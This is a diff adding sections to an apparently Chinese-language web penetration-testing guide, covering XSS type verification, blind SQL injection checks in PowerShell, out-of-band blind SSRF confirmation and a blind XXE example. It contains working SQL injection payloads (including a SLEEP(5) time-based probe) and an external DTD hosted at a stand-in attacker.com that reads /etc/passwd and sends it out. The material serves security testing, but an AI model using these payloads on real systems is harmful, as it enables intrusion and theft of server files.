@@ -75,15 +75,26 @@ $xssParams = @(
     "redirect", "url", "callback", "return"
 )
 
-# 测试 URL 路径
-$xssPaths = @(
-    "/",
-    "/search",
-    "/results",
-    "/error",
-    "/404"
-)
-```
+    # 测试 URL 路径
+    $xssPaths = @(
+        "/",
+        "/search",
+        "/results",
+        "/error",
+        "/404"
+    )
+
+### XSS 三型区分与验证要点
+
+反射、存储、DOM 三种触发路径不同，验证方式不同：
+
+| 类型 | 触发方式 | 验证方法 |
+|------|----------|----------|
+| 反射型 | payload 随响应立即回显 | 响应中出现未编码 payload 即证据 |
+| 存储型 | payload 入库，二次访问触发 | 提交后**再次访问**含该数据的页面确认执行 |
+| DOM 型 | payload 经前端 JS 拼接进 DOM | 浏览器/无头浏览器验证执行；响应中无回显 |
+
+DOM 型额外检查点：`location.hash`、`document.referer`、`window.name` 是否直达 `innerHTML`/`eval`/`document.write` sink（详见 `session-client-side.md` 5.6）。
 
 ### 测试脚本
 
@@ -278,6 +289,24 @@ function Test-SQLInjection {
 }
 ```
 
+### 盲注判定（无报错回显时）
+
+报错注入之外，布尔盲注与时间盲注需基线对比：
+
+```powershell
+# 布尔盲注：AND '1'='1 与 AND '1'='2 的响应差异
+$base = (Invoke-WebRequest -Uri "$TARGET_URL/item?id=1" -UseBasicParsing).Content.Length
+$t = (Invoke-WebRequest -Uri "$TARGET_URL/item?id=1' AND '1'='1" -UseBasicParsing -ErrorAction SilentlyContinue).Content.Length
+$f = (Invoke-WebRequest -Uri "$TARGET_URL/item?id=1' AND '1'='2" -UseBasicParsing -ErrorAction SilentlyContinue).Content.Length
+if ($t -eq $base -and $f -ne $base) { Write-Host "[!] 疑似布尔盲注" }
+
+# 时间盲注：响应时间差（sleep ≤5s，避免 DoS；基线需扣减正常耗时）
+$sw = [Diagnostics.Stopwatch]::StartNew()
+Invoke-WebRequest -Uri "$TARGET_URL/item?id=1' AND SLEEP(5)--" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+$sw.Stop()
+if ($sw.Elapsed.TotalSeconds -ge 4.5) { Write-Host "[!] 疑似时间盲注" }
+```
+
 ---
 
 ## 6.3 命令注入测试
@@ -421,6 +450,15 @@ $ssrfIndicators = @(
 )
 ```
 
+### 盲 SSRF 与 OOB 验证
+
+无回显场景（服务端不返回请求结果）时用外部回连确认：
+
+1. 准备 DNSLog / HTTP 回调平台（dnslog.cn、interact.sh 等）
+2. payload 用平台分配域名：`http://<id>.dnslog.cn/`、`http://<id>.oast.fun/`
+3. 判定：平台收到 DNS 解析/访问记录 → SSRF 成立（即使响应无差异）
+4. 无平台时用响应时间差辅助：内网不可达地址 vs 可达地址的耗时差异
+
 ---
 
 ## 6.5 XXE 测试
@@ -455,6 +493,20 @@ $xxePayloads = @(
     ]>
     <root>test</root>'
 )
+
+### OOB DTD 完整示例与适用条件
+
+上面的 `%file;` 示例需要攻击者可控服务器可访问，且**服务端解析器必须允许加载外部 DTD**。完整 OOB 链路：
+
+```text
+# evil.dtd（托管在 attacker.com）
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
+%eval;
+%exfil;
+```
+
+判定：attacker.com 日志收到带文件内容的请求 → 盲 XXE 成立。注意：多数现代解析器默认禁用外部 DTD，报告中标注"需解析器配置允许才可利用"。
 ```
 
 ---
